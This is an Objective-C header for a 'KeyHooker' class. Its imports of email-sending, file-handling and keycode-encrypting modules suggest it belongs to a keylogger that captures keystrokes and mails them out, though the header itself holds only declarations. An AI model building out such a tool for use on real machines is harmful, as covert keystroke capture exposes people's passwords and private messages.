//
//  KeyboardHooker.h
//  KeyboardHooker
//
//  Created by Иван on 24.11.17.
//  Copyright © 2017 IvanCode. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <SystemConfiguration/SystemConfiguration.h>

#import "Time.h"
#import "KeyRunLoop.h"
#import "EmailSender.h"
#import "FileManager.h"
#import "KeycodeEncrypter.h"

@interface KeyHooker : NSObject

{
    BOOL anyKeyPressed;
    BOOL flag;
    
    BOOL cmd;
    
    NSMutableArray *combination;
}

- (id)init;

- (void)doFullCycle: (int)key;
- (BOOL)checkCombination;
- (void)reset;

@end
